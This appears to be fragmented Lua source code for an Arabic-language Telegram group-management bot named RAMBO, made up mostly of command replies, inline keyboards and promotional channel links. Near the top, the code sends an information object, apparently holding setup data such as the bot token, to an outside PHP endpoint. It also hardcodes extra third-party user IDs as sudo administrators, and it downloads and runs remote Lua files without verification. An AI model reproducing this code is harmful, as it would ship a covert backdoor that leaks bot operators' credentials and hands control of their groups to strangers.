...
https.request('https://devdeiveddev.ml/api/rambo.php/?insert='..JSON.encode(infotnseb))
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Vklkk/RAMBO/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1770621216,1330033222,1293533064}   
...
var = true  
elseif tonumber(user_id) == tonumber(1293533064) then
var = true 
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'رامبو'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
os.execute('wget https://raw.githubusercontent.com/Vklkk/RAMBO/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'⚚ تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⚚ اصدار سورس رامبو { s: 6.7}')
end

if text == 'قناه السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/So0u_rce_Line)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/So0u_rce_Line"}}, 
} 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس 📬', url="t.me/D_V_B_a_h_e_r116BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
send(msg.chat_id_,0," ⚚ العضو : {["..data.first_name_.."](T.ME/So0u_rce_Line)}\n ⚚ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بوت اليوتيوب 💌',url="t.me/Beboty_bot"}},
}
local msg_id = msg.id_/2097152/0.5
...
❲W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚁𝙰𝙼𝙱𝙾❳
❲𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙾❳ ❲𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 🜼❳
╰𖤍━┅┅⟞⟦᪣𝚁𝙰𝙼𝙱𝙾᪣⟧(t.me/So0u_rce_Line)⟝┉┉━𖤍╯
]]
keyboard = {}
keyboard.inline_keyboard = {
{{text = '♔₎𝙳𝚅 𝙱𝙴𝙱𝙾 |:⚚',url="t.me/D_V_B_a_h_e_r"}},
{{text = '♔₎𝙳𝚅 𝙼𝙰𝙽𝙾  |:⚚',url="t.me/D_V_A7_Me_d"}},
...
local Text = [[
 ☃ اهلا بك في سورس رامبو الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ☃ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '♔₎𝙳𝚅 𝙱𝙴𝙱𝙾 |:⚚',url="t.me/D_V_B_a_h_e_r"}},
...
if text == 'مانو'  then
local Text = [[
المطور 💀مانو💀اتبع الزر في الاسفل لتواصل معه👇
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مانوو🇦🇺 ',url="t.me/D_V_A7_Me_d"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'بيبو'  then
local Text = [[
المبرمج ☃بيبو☃ اتبع الزر في الاسفل لتواصل معه 👇
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بيبو🇦🇺',url="t.me/D_V_B_a_h_e_r"}},
}
local msg_id = msg.id_/2097152/0.5
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Vklkk/RAMBO/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/Vklkk/RAMBO/main/File_Bot/"..file)
if res == 200 then
...
' }\n'..' ⚚  الايدي بالصوره ↫ { '..idph..
' }\n'..' ⚚  الرفع ↫ { '..setadd..
' }\n'..' ⚚  الحظر ↫ { '..banm..' }\n\n𖤍━┅┅┄⟞⟦᪣𝚁𝙰𝙼𝙱𝙾᪣⟧⟝┄┉┉━𖤍\n ⚚ قناة سورس رامبو ↓\n [ 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗔𝗹𝗳𝗮 ](t.me/So0u_rce_Line) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/So0u_rce_Line)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/So0u_rce_Line)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/So0u_rce_Line)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/So0u_rce_Line)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/So0u_rce_Line)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/So0u_rce_Line)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/So0u_rce_Line)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/So0u_rce_Line)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/So0u_rce_Line)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/So0u_rce_Line)')
return false
end
end
end
...
[𝚂𝙾𝚄𝚁𝙲𝙴 𝚁𝙰𝙼𝙱𝙾](t.me/So0u_rce_Line)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n𖤍━┅┅┄⟞⟦᪣𝚁𝙰𝙼𝙱𝙾᪣⟧⟝┄┉┉━𖤍ٴ\n  [قناه السورس 💠](t.me/So0u_rce_Line) ')
end
